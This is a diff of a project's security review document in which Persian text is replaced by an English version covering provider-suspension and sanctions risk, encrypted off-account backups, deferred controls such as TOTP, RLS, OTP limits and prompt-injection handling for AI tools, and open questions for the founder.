-## ۱۰. سؤال‌های باز برای بنیان‌گذار (به `STATUS.md` اضافه شود)
-1. **S1:** تأیید سیاست نگه‌داری بخش ۷-۱ (به‌خصوص ۲۴ ماه ممیزی و ۸ هفته پشتیبان) و مهلت ۳۰ روزه‌ی حذف حساب.
-2. **S2:** کلید خصوصی پشتیبان (`age`) کجا و نزد چه کسی نگه داشته شود؟ (پیشنهاد: نزد خود بنیان‌گذار، یک نسخه روی فلش آفلاین و یک نسخه در مدیر رمز شخصی.)
-3. **S3:** آیا مربی می‌پذیرد که هنگام پذیرش دعوت، هنرجو موبایلش را هم وارد کند (C1)؟ (پیشنهاد: بله؛ ۵ ثانیه کار و جلوی تصاحب با لینک فورواردشده را می‌گیرد.)
-4. **S4:** آیا مشاورها با لپ‌تاپ یا گوشی مشترک کار می‌کنند؟ اگر بله، عمر نشست کارکنان از ۷ روز کمتر شود.
+- **H5 (provider terms and sanctions):** from a security standpoint, the main consequence is a **suspension of the account without warning**, that is, losing the Azure application, database and backups at the same time. The needed control is precisely the encrypted backup outside Azure (SEC-K4, SEC-K5), and keeping **the `age` key and the domain registrar (DNS) access** outside that same account so that a migration remains possible. This review does not suggest any way to circumvent the provider's terms. Question Q1 is with the founder only.
+- **H7 (domestic law on keeping data abroad):** a legal review is beyond this role's ability and was **not confirmed**. Risk reduction on our side: data minimization (no national ID number, no address, no email, no platform account password), transparency with the user (SEC-F4: "Your data is kept on a server outside Iran, and we also have an encrypted backup inside Iran"), and the deletion policy (section 7).
+- **The backup destination inside Iran:** the files are encrypted and the private key is not there. So the domestic provider cannot see the content. In an **emergency migration**, the key must come to the Iranian server, and from that moment all the controls of this document (headers, TLS, database firewall, logs) must also hold on the new host. The migration runbook checklist (DO) should refer to section 5 of this document.
+
+---
+
+## 9. Outside 0.1 (for the 1.0 ADRs)
+- **Admin two-step login:** TOTP (an authenticator app, with no SMS dependency) **before inviting a second admin or reaching more than 150 students**, whichever comes first.
+- **RLS** on `notes`, `student_flags` and `student_health` together with the AI module (ADR-0004 says the same).
+- **SMS OTP (F16):** a send rate limit per mobile number and IP, a lifetime of 2 minutes, at most 5 attempts, and the SIM swap risk for staff accounts (OTP alone is not enough for staff).
+- **AI tools:** the job post and proposal text input is **untrusted** (prompt injection), must not leak the system prompt, a cost quota before the call (F17), removing the client's and the student's names before sending to the provider, and respecting `ai_use_consent` and its withdrawal.
+- **Payments:** confirm the amount and status on the server side with the gateway API (not the callback), idempotency, a domestic callback relay if the server is abroad. In the `billing` module ADR.
+
+## 10. Open questions for the founder (to be added to `STATUS.md`)
+1. **S1:** Approve the retention policy of section 7-1 (especially the 24 months of audit and 8 weeks of backups) and the 30-day account deletion deadline.
+2. **S2:** Where and with whom should the backup private key (`age`) be kept? (Proposal: with the founder, one copy on an offline flash drive and one in a personal password manager.)
+3. **S3:** Does the coach accept that on accepting an invite the student also enters their mobile number (C1)? (Proposal: yes; it takes 5 seconds and prevents takeover through a forwarded link.)
+4. **S4:** Do the mentors work on a shared laptop or phone? If yes, the staff session lifetime should be shorter than 7 days.
